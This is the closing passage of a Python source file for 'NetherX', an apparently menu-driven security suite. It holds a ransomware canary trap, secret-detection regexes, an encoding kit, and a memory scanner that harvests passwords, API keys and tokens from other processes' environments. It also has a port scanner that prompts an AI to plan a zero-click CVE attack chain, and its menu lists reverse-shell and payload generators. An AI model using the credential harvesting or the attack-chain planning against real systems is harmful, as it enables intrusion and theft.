<p style="color:#888;margin-top:30px">Confidential - authorized recipients only. Developer: GᕼOᔕTᗰEOᗯ.</p></body></html>"""
    try:
        with open(out, 'w', encoding='utf-8') as f:
            f.write(html)
        print_success(f'HTML report saved: {out}')
    except Exception as e:
        print_error(f'Report generation failed: {e}')

# ---------- 71. LOCAL AI (OLLAMA) ----------
def local_ai_ollama():
    print_info('Checking local Ollama at http://localhost:11434 ...')
    try:
        models = [m.get('name') for m in _http_json('http://localhost:11434/api/tags', timeout=5).get('models', [])]
    except Exception:
        print_error('Ollama not running. Install: https://ollama.com then: ollama pull llama3')
        return
    if not models:
        print_error('No local models. Run: ollama pull llama3')
        return
    print_success(f'Local models: {", ".join(models)}')
    model = get_input(f"{BOLD}Model (Enter = {models[0]}): {RESET}") or models[0]
    q = get_input(f"{BOLD}Your security question: {RESET}")
    if not q: return
    print_info('Thinking locally (100% private - data leaves nothing)...')
    try:
        payload = json.dumps({'model': model, 'prompt': q, 'stream': False}).encode()
        req = urllib.request.Request('http://localhost:11434/api/generate', data=payload, headers={'Content-Type': 'application/json'})
        with urllib.request.urlopen(req, timeout=120) as resp:
            print(f"\n{YELLOW}--- OLLAMA RESPONSE ---{RESET}")
            print(json.loads(resp.read().decode()).get('response', '(empty)'))
    except Exception as e:
        print_error(f'Ollama query failed: {e}')

# ==========================================
# v6.0 PRIVACY SHIELD + SPINNER + BOOT + UTILS
# ==========================================
REDACT_PATTERNS = [
    (r'(ghp_[0-9a-zA-Z]{36}|AKIA[0-9A-Z]{16}|xox[baprs]-[0-9a-zA-Z-]+|sk-[A-Za-z0-9]{20,})', '[KEY_REDACTED]'),
    (r"(?i)(password|passwd|pwd|secret|token|api[_-]?key)\s*[:=]\s*['\"]?[^'\"\s,}]+", r'\1=[REDACTED]'),
    (r'[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}', '[EMAIL_REDACTED]'),
    (r'\b[0-9a-fA-F]{32,64}\b', '[HASH_REDACTED]'),
]

def redact_sensitive(text):
    for pat, rep in REDACT_PATTERNS:
        text = re.sub(pat, rep, text)
    return text

def privacy_wipe():
    try:
        if os.path.exists('/tmp/_suite_task_script.py'):
            os.remove('/tmp/_suite_task_script.py')
    except Exception:
        pass

SPIN_FRAMES = ['⠋','⠙','⠹','⠸','⠼','⠴','⠦','⠧','⠇','⠏']

def _spinner_run(stop_event, label):
    i = 0
    while not stop_event.is_set():
        sys.stdout.write(f"\r  {GREEN}{SPIN_FRAMES[i % len(SPIN_FRAMES)]}{RESET} {CYAN}{label}...{RESET}     ")
        sys.stdout.flush()
        time.sleep(0.1)
        i += 1
    sys.stdout.write("\r" + " " * 60 + "\r")
    sys.stdout.flush()

def ai_assess(prompt):
    print(f"\n{MAGENTA}[+] Querying OpenRouter (privacy shield active)...{RESET}")
    print(f"{YELLOW}--- OpenRouter RESPONSE ---{RESET}")
    stop = threading.Event()
    t = threading.Thread(target=_spinner_run, args=(stop, "AI analyzing"), daemon=True)
    t.start()
    result = call_gemini(redact_sensitive(prompt))
    stop.set()
    t.join()
    print(result)
    privacy_wipe()
    print(f"{GRAY}[🔒 Privacy: prompt sanitized + session data wiped]{RESET}")

def boot_sequence():
    steps = [
        ("Initializing NetherX kernel v6.0 Pro", CYAN),
        ("Loading 73 security modules", GREEN),
        ("Starting AI engine (OpenRouter)", MAGENTA),
        ("Connecting Daytona cloud sandbox", CYAN),
        ("Arming privacy shield (auto-wipe mode)", GREEN),
        ("Rendering Matrix interface", YELLOW),
    ]
    print()
    for text, col in steps:
        for i in range(1, 5):
            sys.stdout.write(f"\r  {col}[*] {text} {'.' * i}{RESET}        ")
            sys.stdout.flush()
            time.sleep(0.10)
        sys.stdout.write(f"\r  {GREEN}[+] {text} ... [OK]{RESET}          \n")
    print()

def _rot13(s):
    out = []
    for ch in s:
        if 'a' <= ch <= 'z': out.append(chr((ord(ch) - 97 + 13) % 26 + 97))
        elif 'A' <= ch <= 'Z': out.append(chr((ord(ch) - 65 + 13) % 26 + 65))
        else: out.append(ch)
    return ''.join(out)

def encoding_toolkit():
    print_section('ENCODING / DECODING TOOLKIT (100% LOCAL - no AI)')
    print(' 1. Base64 Encode    2. Base64 Decode')
    print(' 3. Hex Encode       4. Hex Decode')
    print(' 5. URL Encode       6. URL Decode')
    print(' 7. ROT13            8. Binary Encode')
    print(' 9. Binary Decode    10. XOR Encode/Decode')
    ch = get_input(f"{BOLD}Select (1-10): {RESET}")
    if not ch: return
    data = get_input(f"{BOLD}Enter text: {RESET}")
    if not data: print_error('No input.'); return
    out = None
    try:
        if ch == '1': out = base64.b64encode(data.encode()).decode()
        elif ch == '2': out = base64.b64decode(data.encode()).decode(errors='ignore')
        elif ch == '3': out = data.encode().hex()
        elif ch == '4': out = bytes.fromhex(data.replace(' ', '')).decode(errors='ignore')
        elif ch == '5': out = urllib.parse.quote(data, safe='')
        elif ch == '6': out = urllib.parse.unquote(data)
        elif ch == '7': out = _rot13(data)
        elif ch == '8': out = ' '.join(format(b, '08b') for b in data.encode())
        elif ch == '9': out = bytes(int(b, 2) for b in data.split()).decode(errors='ignore')
        elif ch == '10':
            key = get_input(f"{BOLD}Enter XOR key: {RESET}")
            if not key: print_error('No key.'); return
            kb = key.encode()
            toks = data.split()
            if len(toks) > 1 and all(re.fullmatch(r'[0-9a-fA-F]{2}', t) for t in toks):
                out = bytes(int(t, 16) ^ kb[i % len(kb)] for i, t in enumerate(toks)).decode(errors='ignore')
            else:
                out = ' '.join(f'{c ^ kb[i % len(kb)]:02x}' for i, c in enumerate(data.encode()))
        else:
            print_error('Invalid choice.'); return
        print(f"\n  {GREEN}{BOLD}RESULT:{RESET} {CYAN}{out}{RESET}\n")
    except Exception as e:
        print_error(f'Operation failed: {e}')

def github_update_checker():
    print_info('Checking GitHub for latest NetherX version...')
    LOCAL_VERSION = "6.0"
    try:
        # 1) Fetch remote version file (real update detection)
        remote_version = None
        try:
            req = urllib.request.Request('https://raw.githubusercontent.com/NetherX-Creator/NetherX-CyberSecurity-Suite/main/version.txt', headers={'User-Agent': 'NetherX/5.0'})
            with urllib.request.urlopen(req, timeout=15) as resp:
                remote_version = resp.read().decode().strip()
        except Exception:
            remote_version = None

        # 2) Fetch latest commit info
        req = urllib.request.Request('https://api.github.com/repos/NetherX-Creator/NetherX-CyberSecurity-Suite/commits/main', headers={'User-Agent': 'NetherX/5.0'})
        with urllib.request.urlopen(req, timeout=15) as resp:
            data = json.loads(resp.read().decode())
        sha = data.get('sha', '')[:7]
        msg = (data.get('commit', {}).get('message', '') or '?').splitlines()[0]
        date = (data.get('commit', {}).get('committer', {}).get('date', '') or '')[:10]

        print_section('UPDATE CHECK')
        print(f' Local version:  v{LOCAL_VERSION} Pro (73 modules)')
        print(f' Latest commit:  {sha} | {date}')
        print(f' Message:        {msg}')
        print(f' Repo:           https://github.com/NetherX-Creator/NetherX-CyberSecurity-Suite')

        # 3) Real comparison
        if remote_version:
            try:
                lv, loc = float(remote_version), float(LOCAL_VERSION)
            except Exception:
                lv, loc = 0.0, 0.0
            if lv > loc:
                print(f'{RED}[!] UPDATE AVAILABLE: GitHub has v{remote_version}, you are running v{LOCAL_VERSION}.{RESET}')
                print(f'{YELLOW}[*] Get the latest code: git pull (or re-download from GitHub){RESET}')
            else:
                print(f'{GREEN}[+] You are up to date (v{LOCAL_VERSION}). No update available.{RESET}')
        else:
            print(f'{YELLOW}[!] version.txt not found on GitHub - cannot verify remote version.{RESET}')
            print(f'{GREEN}[+] To get the latest code: git pull (or re-download from GitHub){RESET}')
    except Exception as e:
        print_error(f'Update check failed: {e}')

MENU_UTILS = [
    ("72", YELLOW, "Encode/Decode Kit"),
    ("73", GREEN,  "Update Checker"),
]

# ==========================================
# v6.0 ELITE PACK: THEMES + KILL-SWITCH + RAM GHOST + CHAIN REACTOR
# ==========================================
THEMES = {
    'MATRIX': {'G1': (0,255,65),  'G2': (140,255,160), 'GD': (0,110,25),
               'MGREEN': [(0,255,65),(0,230,60),(0,200,50),(50,255,100),(120,255,140)],
               'MLIME': [(140,255,140),(120,255,100),(100,240,80),(120,255,100),(140,255,140)]},
    'GHOST':  {'G1': (160,60,240),'G2': (220,160,255), 'GD': (80,0,160),
               'MGREEN': [(80,0,160),(120,20,200),(160,60,240),(200,110,255),(220,160,255)],
               'MLIME': [(200,110,255),(160,60,240),(120,20,200),(160,60,240),(200,110,255)]},
    'EMBER':  {'G1': (255,100,10),'G2': (255,210,90),  'GD': (140,0,0),
               'MGREEN': [(255,60,0),(255,100,10),(255,140,30),(255,180,60),(255,210,90)],
               'MLIME': [(255,180,60),(255,140,30),(255,100,10),(255,140,30),(255,180,60)]},
    'ICE':    {'G1': (20,210,240),'G2': (180,250,255), 'GD': (0,90,130),
               'MGREEN': [(0,180,220),(20,210,240),(60,230,255),(120,245,255),(180,250,255)],
               'MLIME': [(120,245,255),(60,230,255),(20,210,240),(60,230,255),(120,245,255)]},
}

def load_theme():
    global G1, G2, GD, MGREEN, MLIME
    t = THEMES.get(load_config().get('theme', 'MATRIX'), THEMES['MATRIX'])
    G1 = c(*t['G1']); G2 = c(*t['G2']); GD = c(*t['GD'])
    MGREEN = t['MGREEN']; MLIME = t['MLIME']

def apply_theme(name):
    global G1, G2, GD, MGREEN, MLIME
    t = THEMES.get(name.upper(), THEMES['MATRIX'])
    G1 = c(*t['G1']); G2 = c(*t['G2']); GD = c(*t['GD'])
    MGREEN = t['MGREEN']; MLIME = t['MLIME']
    cfg = load_config()
    cfg['theme'] = name.upper()
    save_config(cfg)
    print_success(f'Theme switched to {name.upper()} (saved to config).')

def theme_selector():
    print_section('THEME SELECTOR')
    names = list(THEMES.keys())
    for i, n in enumerate(names, 1):
        r, g, b = THEMES[n]['G1']
        print(f'  {i}. {c(r,g,b)}{BOLD}{n}{RESET}')
    ch = get_input(f"{BOLD}Select theme (1-{len(names)}): {RESET}")
    if ch and ch.isdigit() and 1 <= int(ch) <= len(names):
        apply_theme(names[int(ch) - 1])
    else:
        print_error('Invalid choice.')

# ---------- 74. RANSOMWARE KILL-SWITCH TRAP ----------
BAIT_DIR = os.path.join(os.path.expanduser("~"), "netherx_bait")
RANSOM_LOG = os.path.join(os.path.expanduser("~"), ".netherx_ransom_log.json")

def _hash_file(p):
    try:
        with open(p, 'rb') as f:
            return hashlib.sha256(f.read()).hexdigest()
    except Exception:
        return None

def _find_writer(fp):
    try:
        if sys.platform == 'win32':
            r = subprocess.run(['powershell', '-Command',
                "Get-Process | Sort-Object StartTime -Descending | Select-Object -First 3 Name,Id"],
                capture_output=True, text=True, timeout=5)
            return r.stdout.strip().replace('\n', ' | ') or None
        else:
            r = subprocess.run(['lsof', fp], capture_output=True, text=True, timeout=5)
            lines = r.stdout.strip().splitlines()
            if len(lines) > 1:
                return lines[1].split()[0] + ' (PID ' + lines[1].split()[1] + ')'
    except Exception:
        pass
    return None

def ransomware_kill_switch():
    print_info('Ransomware Kill-Switch Trap (Crypto-Honeypot)')
    os.makedirs(BAIT_DIR, exist_ok=True)
    baits = ['payroll_2026.xlsx', 'passwords_master.docx', 'bank_backup.zip', 'family_photos.rar', 'wallet_seed.txt']
    for b in baits:
        fp = os.path.join(BAIT_DIR, b)
        if not os.path.exists(fp):
            with open(fp, 'w') as f:
                f.write('NETHERX CANARY FILE - DO NOT ENCRYPT - ' + b + '\n' + ('A' * 500))
    baseline = {os.path.join(BAIT_DIR, b): _hash_file(os.path.join(BAIT_DIR, b)) for b in baits}
    base_files = set(os.listdir(BAIT_DIR))
    print_success(f'Bait vault armed: {BAIT_DIR}')
    print(f'  {len(baits)} decoy files planted (fake payroll, passwords, wallet).')
    print_info('Monitoring for encryption/tampering... Press Ctrl+C to disarm.')
    print(f"{RED}{BOLD}If ANY process touches these files, it will be flagged & trapped.{RESET}\n")
    try:
        while True:
            time.sleep(2)
            current = set(os.listdir(BAIT_DIR))
            new_files = current - base_files
            for fp, h0 in baseline.items():
                h1 = _hash_file(fp)
                gone = h1 is None
                if gone or h1 != h0:
                    ts = datetime.now(timezone.utc).isoformat()
                    print()
                    print(f"{RED}{BOLD}{'='*70}{RESET}")
                    print(f"{RED}{BOLD}  🚨 RANSOMWARE BEHAVIOR DETECTED!{RESET}  {CYAN}{ts}{RESET}")
                    print(f"{RED}{BOLD}{'='*70}{RESET}")
                    print(f"  {BOLD}Trapped file:{RESET}   {YELLOW}{os.path.basename(fp)}{RESET}")
                    print(f"  {BOLD}Event:{RESET}          {'FILE DELETED/LOCKED' if gone else 'CONTENT MODIFIED (encryption pattern)'}")
                    writer = _find_writer(fp)
                    if writer:
                        print(f"  {BOLD}Suspect process:{RESET} {RED}{writer}{RESET}")
                    notes = [f for f in new_files if any(k in f.lower() for k in ['readme', 'decrypt', 'ransom', 'txt', 'html'])]
                    if notes:
                        print(f"  {BOLD}Ransom note dropped:{RESET} {RED}{', '.join(notes)}{RESET}")
                    try:
                        logs = json.load(open(RANSOM_LOG)) if os.path.exists(RANSOM_LOG) else []
                        logs.append({'timestamp': ts, 'file': fp, 'event': 'deleted' if gone else 'modified', 'suspect': writer})
                        json.dump(logs, open(RANSOM_LOG, 'w'), indent=2)
                        print(f"  {GREEN}[+] Evidence saved: {RANSOM_LOG}{RESET}")
                    except Exception:
                        pass
                    print(f"{RED}{BOLD}{'='*70}{RESET}\n")
                    baseline[fp] = h1
            base_files = current
    except KeyboardInterrupt:
        print()
        print_info('Kill-Switch Trap disarmed. Vault intact.')

# ---------- 75. RAM GHOST EXTRACTOR ----------
GHOST_PATTERNS = [
    ('PLAIN PASSWORD', re.compile(r'(?i)(password|passwd|pwd)\s*[=:]\s*\S{4,}')),
    ('API KEY', re.compile(r'\b(?:ghp_[0-9a-zA-Z]{36}|AKIA[0-9A-Z]{16}|sk-[0-9a-zA-Z]{20,}|xox[baprs]-[0-9a-zA-Z-]+)\b')),
    ('PRIVATE KEY', re.compile(r'-----BEGIN [A-Z ]*PRIVATE KEY-----')),
    ('JWT TOKEN', re.compile(r'\beyJ[0-9a-zA-Z_-]{10,}\.[0-9a-zA-Z_-]{10,}\.[0-9a-zA-Z_-]{5,}\b')),
    ('SESSION/TOKEN', re.compile(r'(?i)(session|token|sid)=[0-9a-zA-Z_-]{16,}')),
    ('URL/BEACON', re.compile(r'https?://[0-9a-zA-Z./_?=&%-]+')),
]

def _hunt_text(text, src):
    out = []
    for kind, rx in GHOST_PATTERNS:
        for m in rx.finditer(text):
            out.append((kind, src, m.group(0)))
    return out

def ram_ghost_extractor():
    print_info('RAM Ghost Extractor (Memory Forensics)')
    print(' 1. Live process memory hunt (this system)')
    print(' 2. Analyze a memory dump file')
    ch = get_input(f"{BOLD}Select (1-2): {RESET}")
    findings = []
    if ch == '1':
        print_info('Scanning live process memory for ghost secrets...')
        if sys.platform == 'win32':
            print_warn('Live scan limited on Windows - scanning own environment only. Use Option 2 for dumps.')
            findings += _hunt_text('\n'.join(f'{k}={v}' for k, v in os.environ.items()), 'OWN-ENV')
        else:
            for pid in [p for p in os.listdir('/proc') if p.isdigit()][:200]:
                try:
                    with open(f'/proc/{pid}/cmdline', 'rb') as f:
                        cmd = f.read().replace(b'\x00', b' ').decode(errors='ignore')
                    with open(f'/proc/{pid}/environ', 'rb') as f:
                        env = f.read().replace(b'\x00', b'\n').decode(errors='ignore')
                    name = cmd[:40] or f'PID {pid}'
                    findings += _hunt_text(env, f'{name} (environ)')
                    findings += _hunt_text(cmd, f'{name} (cmdline)')
                except Exception:
                    continue
    elif ch == '2':
        path = get_input(f"{BOLD}Enter dump file path: {RESET}")
        if not path or not os.path.exists(path):
            print_error('File not found.'); return
        with open(path, 'rb') as f:
            data = f.read(20 * 1024 * 1024)
        findings += _hunt_text(data.decode('utf-8', errors='ignore'), os.path.basename(path))
    else:
        print_error('Invalid choice.'); return
    print_section('RAM GHOST EXTRACTION RESULTS')
    if findings:
        print_warn(f'{len(findings)} ghost artifacts pulled from memory:')
        for kind, src, sample in findings[:40]:
            print(f"  {RED}[{kind}]{RESET} {GRAY}({src}){RESET} {CYAN}{sample[:90]}{RESET}")
    else:
        print_success('No credential ghosts found in scanned memory.')
    try:
        s = '\n'.join(f'{k}: {smp[:60]}' for k, _, smp in findings[:20])
        if s:
            prompt = f"These artifacts were extracted from memory. Explain the forensic value and how defenders use them:\n\n{s}"
            ai_assess(prompt)
    except Exception as e:
        print_error(f'AI analysis failed: {e}')

# ---------- 76. ZERO-CLICK CHAIN REACTOR ----------
def zero_click_chain_reactor():
    target = safe_domain(get_input(f"{BOLD}Enter target domain/IP (authorized testing only): {RESET}"))
    if not target: print_error('No target.'); return
    print_info('Probing attack surface (zero-click vectors)...')
    svc_map = {21:'FTP',22:'SSH',25:'SMTP',80:'HTTP',443:'HTTPS',445:'SMB',1433:'MSSQL',3306:'MySQL',3389:'RDP',5900:'VNC',8080:'HTTP-Proxy',8443:'HTTPS-Alt'}
    open_ports = []
    for port in svc_map:
        try:
            s = socket.create_connection((target, port), timeout=2)
            s.close()
            open_ports.append(port)
        except Exception:
            continue
    server = ''
    try:
        req = urllib.request.Request(f'https://{target}', headers={'User-Agent': 'NetherX/6.0'})
        with urllib.request.urlopen(req, timeout=6) as r:
            server = r.headers.get('Server', '')
    except Exception:
        pass
    print_section('ATTACK SURFACE')
    print(f' Open ports:   {[f"{p}/{svc_map[p]}" for p in open_ports] or "none"}')
    if server: print(f' Server banner: {server}')
    if not open_ports:
        print_warn('No common ports open - chain reactor needs a surface.'); return
    try:
        nodes = [f"{p}/{svc_map[p]}" for p in open_ports]
        prompt = (f"Target {target} has open ports: {nodes}, server banner: '{server}'. "
                  "Act as an elite red-teamer. Build a ZERO-CLICK attack chain graph chaining known CVEs "
                  "(e.g., SMB->EternalBlue, RDP->BlueKeep, HTTP->RCE) from initial access to full compromise. "
                  "Output as plain-text arrows like [445/SMB] -> CVE-2017-0144 -> SYSTEM. Max 6 hops. "
                  "Then one line: how a defender breaks this chain. Educational/authorized context only.")
        print(f"\n{MAGENTA}{BOLD}--- ZERO-CLICK CHAIN GRAPH ---{RESET}")
        ai_assess(prompt)
    except Exception as e:
        print_error(f'Chain generation failed: {e}')

MENU_ELITE = [
    ("74", RED,     "Ransom Trap"),
    ("75", MAGENTA, "RAM Ghost"),
    ("76", YELLOW,  "Chain Reactor"),
    ("77", CYAN,    "Theme Selector"),
]

# ==========================================
# MAIN LOOP
# ==========================================

def main():
    boot_sequence()
    get_input(f"{BOLD}Press Enter to launch NetherX...{RESET}")
    while True:
        show_menu()
        choice = get_input(f"\n{G1}NetherX@CyberSecurity:~${RESET} {BOLD}{G2}select (1-77){RESET} {G1}❯{RESET} ")
        if choice is None:
            print(f"\n{GREEN}[*] Exiting System. Stay Safe!{RESET}")
            sys.exit(0)

        if choice == '57':
            try:
                run_honeytoken_tracker()
            except Exception as e:
                print_error(f'Tracker failed: {e}')
            press_enter()
            continue

        if choice == '58':
            try:
                show_developer_info()
            except Exception as e:
                print_error(f'Info display failed: {e}')
            press_enter()
            continue

        if choice == '56':
            print(f"\n{GREEN}[*] Exiting NetherX Security Suite. Stay Safe!{RESET}")
            sys.exit(0)

        if choice == '55':
            try:
                print_general_help()
            except Exception as e:
                print_error(f'Help display failed: {e}')
            press_enter()
            continue

        # Options that don't need sandbox
        no_sandbox_options = {'6', '11', '14', '15', '19', '20', '21', '22', '25', '26', '27', '28', '30', '33', '35', '38', '39', '40', '41', '42', '43', '44', '45', '46', '47', '49', '50', '51', '54', '57', '59', '60', '61', '62', '63', '69', '70', '71', '72', '73', '74', '75', '76', '77'}

        if choice in no_sandbox_options:
            try:
                if choice == '6':
                    search_cve_ai()
                elif choice == '11':
                    target = get_input(f"{BOLD}Enter target domain: {RESET}")
                    if target:
                        sb = create_cloud_sandbox()
                        if sb:
                            dir_brute_forcer(sb, target)
                            try: sb.delete()
                            except: pass
                elif choice == '14':
                    jwt_analyzer()
                elif choice == '15':
                    secret_scanner()
                elif choice == '19':
                    wifi_security_auditor()
                elif choice == '20':
                    firewall_config_analyzer()
                elif choice == '21':
                    network_traffic_analyzer()
                elif choice == '22':
                    pcap_analyzer()
                elif choice == '25':
                    analyze_password_or_hash()
                elif choice == '26':
                    log_file_analyzer()
                elif choice == '27':
                    registry_forensics()
                elif choice == '28':
                    memory_dump_analyzer()
                elif choice == '30':
                    file_integrity_monitor()
                elif choice == '33':
                    audit_dependencies()
                elif choice == '35':
                    cloud_misconfig_scanner()
                elif choice == '38':
                    sbom_generator()
                elif choice == '39':
                    compliance_checker()
                elif choice == '40':
                    supply_chain_risk_auditor()
                elif choice == '41':
                    incident_response_advisor()
                elif choice == '42':
                    threat_intel_feed()
                elif choice == '43':
                    ioc_scanner()
                elif choice == '44':
                    yara_rule_generator()
                elif choice == '45':
                    dark_web_monitor()
                elif choice == '46':
                    se_toolkit()
                elif choice == '47':
                    reverse_shell_generator()
                elif choice == '49':
                    ddos_resilience_advisor()
                elif choice == '50':
                    backup_integrity_verifier()
                elif choice == '51':
                    ransomware_readiness_check()
                elif choice == '54':
                    steganography_analyzer()
                elif choice == '60':
                    deep_ip_intel()
                elif choice == '59':
                    virustotal_lookup()
                elif choice == '61':
                    abuseipdb_check()
                elif choice == '62':
                    nvd_cve_lookup()
                elif choice == '63':
                    hibp_password_check()
                elif choice == '69':
                    cvss_calculator()
                elif choice == '70':
                    pentest_report_generator()
                elif choice == '71':
                    local_ai_ollama()
                elif choice == '72':
                    encoding_toolkit()
                elif choice == '73':
                    github_update_checker()
                elif choice == '74':
                    ransomware_kill_switch()
                elif choice == '75':
                    ram_ghost_extractor()
                elif choice == '76':
                    zero_click_chain_reactor()
                elif choice == '77':
                    theme_selector()
            except Exception as e:
                print_error(f'Option {choice} failed: {e}')
            press_enter()
            continue

        # Options that need sandbox
        sandbox = None
        try:
            if choice == '1':
                file_path = get_input(f"{BOLD}Enter file path (e.g., C:\\path\\to\\file.py): {RESET}")
                if file_path:
                    sandbox = create_cloud_sandbox()
                    if sandbox:
                        audit_file(sandbox, file_path)

            elif choice == '2':
                url = get_input(f"{BOLD}Enter suspicious URL: {RESET}")
                if url:
                    sandbox = create_cloud_sandbox()
                    if sandbox:
                        analyze_phishing_url(sandbox, url)

            elif choice == '3':
                target = get_input(f"{BOLD}Enter target domain/IP: {RESET}")
                if target:
                    sandbox = create_cloud_sandbox()
                    if sandbox:
                        scan_network(sandbox, target)

            elif choice == '4':
                target = get_input(f"{BOLD}Enter website domain: {RESET}")
                if target:
                    sandbox = create_cloud_sandbox()
                    if sandbox:
                        scan_web_headers(sandbox, target)

            elif choice == '5':
                target = get_input(f"{BOLD}Enter domain name: {RESET}")
                if target:
                    sandbox = create_cloud_sandbox()
                    if sandbox:
                        scan_dns_recon(sandbox, target)

            elif choice == '7':
                target = get_input(f"{BOLD}Enter root domain (e.g., example.com): {RESET}")
                if target:
                    sandbox = create_cloud_sandbox()
                    if sandbox:
                        enumerate_subdomains(sandbox, target)

            elif choice == '8':
                target = get_input(f"{BOLD}Enter target domain (e.g., example.com): {RESET}")
                if target:
                    inspect_ssl_certificate(target)

            elif choice == '9':
                target = get_input(f"{BOLD}Enter target website domain: {RESET}")
                if target:
                    sandbox = create_cloud_sandbox()
                    if sandbox:
                        scan_exposed_files(sandbox, target)

            elif choice == '10':
                target = get_input(f"{BOLD}Enter website domain for deep header analysis: {RESET}")
                if target:
                    sandbox = create_cloud_sandbox()
                    if sandbox:
                        deep_header_analysis(sandbox, target)

            elif choice == '12':
                target = get_input(f"{BOLD}Enter target domain for API fuzzing: {RESET}")
                if target:
                    sandbox = create_cloud_sandbox()
                    if sandbox:
                        api_endpoint_fuzzer(sandbox, target)

            elif choice == '13':
                generate_payloads()

            elif choice == '16':
                target = get_input(f"{BOLD}Enter target domain for API security scan: {RESET}")
                if target:
                    sandbox = create_cloud_sandbox()
                    if sandbox:
                        api_security_scanner(sandbox, target)

            elif choice == '17':
                target = get_input(f"{BOLD}Enter target domain/IP: {RESET}")
                if target:
                    sandbox = create_cloud_sandbox()
                    if sandbox:
                        match_port_vulnerabilities(sandbox, target)

            elif choice == '18':
                target = get_input(f"{BOLD}Enter target domain: {RESET}")
                if target:
                    sandbox = create_cloud_sandbox()
                    if sandbox:
                        whois_geo_tracker(sandbox, target)

            elif choice == '23':
                sandbox = create_cloud_sandbox()
                if sandbox:
                    arp_spoofing_detector(sandbox)

            elif choice == '24':
                sandbox = create_cloud_sandbox()
                if sandbox:
                    dns_tunneling_detector(sandbox)

            elif choice == '29':
                sandbox = create_cloud_sandbox()
                if sandbox:
                    process_anomaly_detector(sandbox)

            elif choice == '31':
                sandbox = create_cloud_sandbox()
                if sandbox:
                    keylogger_detector(sandbox)

            elif choice == '32':
                sandbox = create_cloud_sandbox()
                if sandbox:
                    rootkit_scanner(sandbox)

            elif choice == '34':
                sandbox = create_cloud_sandbox()
                if sandbox:
                    container_security_scan(sandbox)

            elif choice == '36':
                sandbox = create_cloud_sandbox()
                if sandbox:
                    s3_bucket_scanner(sandbox)

            elif choice == '37':
                sandbox = create_cloud_sandbox()
                if sandbox:
                    database_security_scan(sandbox)

            elif choice == '48':
                sandbox = create_cloud_sandbox()
                if sandbox:
                    email_security_auditor(sandbox)

            elif choice == '52':
                sandbox = create_cloud_sandbox()
                if sandbox:
                    malware_sandbox_simulator(sandbox)

            elif choice == '53':
                sandbox = create_cloud_sandbox()
                if sandbox:
                    full_system_health_audit(sandbox)
            elif choice == '64':
                sandbox = create_cloud_sandbox()
                if sandbox:
                    subdomain_takeover_detector(sandbox)
            elif choice == '65':
                sandbox = create_cloud_sandbox()
                if sandbox:
                    waf_detector(sandbox)
            elif choice == '66':
                sandbox = create_cloud_sandbox()
                if sandbox:
                    wp_cms_scanner(sandbox)
            elif choice == '67':
                sandbox = create_cloud_sandbox()
                if sandbox:
                    recon_pipeline(sandbox)
            elif choice == '68':
                sandbox = create_cloud_sandbox()
                if sandbox:
                    nuclei_scan(sandbox)

            else:
                print(f"\n{RED}[!] Invalid choice! Try again.{RESET}")

        except Exception as e:
            print(f"\n{RED}[!] Error: {e}{RESET}")

        finally:
            if sandbox:
                try:
                    sandbox.delete()
                    print(f"{CYAN}[*] Cloud Sandbox Safely Closed.{RESET}")
                except Exception as e:
                    print_warn(f'Sandbox cleanup warning: {e}')

        press_enter()


if __name__ == "__main__":
    try:
        init_clients()
        main()
    except KeyboardInterrupt:
        print(f"\n\n{GREEN}[*] Interrupted. Stay Safe!{RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{RED}[!] Fatal error: {e}{RESET}")
        sys.exit(1)
